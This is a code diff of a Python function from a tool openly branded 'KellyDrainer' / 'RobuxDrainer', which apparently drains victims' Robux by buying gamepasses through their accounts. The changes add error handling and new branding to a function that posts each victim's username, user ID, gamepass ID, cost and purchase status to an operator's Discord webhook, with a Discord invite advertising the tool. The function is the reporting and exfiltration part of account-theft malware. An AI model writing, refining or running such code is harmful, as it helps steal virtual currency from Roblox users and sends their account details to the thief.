@@ -1,42 +1,46 @@
-from datetime import datetime
+from datetime import datetime, timezone
 import requests
 
 def send_discord_webhook(webhook, username, user_id, gaid, cost, status_code, status_json, headshot_trash, userid):
     avatar_api_url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png&isCircular=false"
-    
     final_img = "https://static.wikia.nocookie.net/roblox/images/6/66/Content_Deleted.png"
     
     try:
-        response = requests.get(avatar_api_url).json()
-        if "data" in response and len(response["data"]) > 0:
-            final_img = response["data"][0]["imageUrl"]
+        response = requests.get(avatar_api_url)
+        if response.status_code == 200:
+            res_json = response.json()
+            if "data" in res_json and len(res_json["data"]) > 0:
+                final_img = res_json["data"][0].get("imageUrl", final_img)
     except Exception as e:
-        print(f"Ошибка при получении аватарки: {e}")
+        print(f"Thumbnail Error: {e}")
 
     if isinstance(status_json, dict):
-        p = status_json.get("purchased")
+        p = status_json.get("purchased", False)
         status_text = "✅ Success" if p else "❌ Failed"
-        reason = status_json.get("reason", "None")
     else:
         status_text = f"Code: {status_code}"
-        reason = str(status_json)
 
     embed = {
         "title": f"@{username} ({user_id})",
-        "color": 0xFFFFFF if "Success" in status_text else 0xe74c3c,
-        "thumbnail": {"url": str(final_img)}, 
+        "color": 16777215 if "Success" in status_text else 0xFF0000,
+        "thumbnail": {"url": final_img}, 
         "fields": [
             {"name": "Gamepass ID", "value": f"`{gaid}`", "inline": True},
             {"name": "Cost", "value": f"**{cost} R$**", "inline": True}
         ],
-        "footer": {"text": "KellyDrainer"},
-        "timestamp": datetime.utcnow().isoformat()
+        "footer": {"text": "discord.gg/kellystock"},
+        "timestamp": datetime.now(timezone.utc).isoformat()
     }
 
     data = {
-        "content": f"<@{userid}>",
-        "username": "RobuxDrainer",
+        "content": f"<@{userid}>" if userid else "",
+        "username": "kellydrainer",
         "embeds": [embed]
     }
 
-    requests.post(webhook, json=data)
+    try:
+        res = requests.post(webhook, json=data)
+        if res.status_code not in [200, 204]:
+            print(f"[!] Webhook failed with status {res.status_code}: {res.text}")
+    except Exception as e:
+        print(f"[!] Critical Webhook Error: {e}")
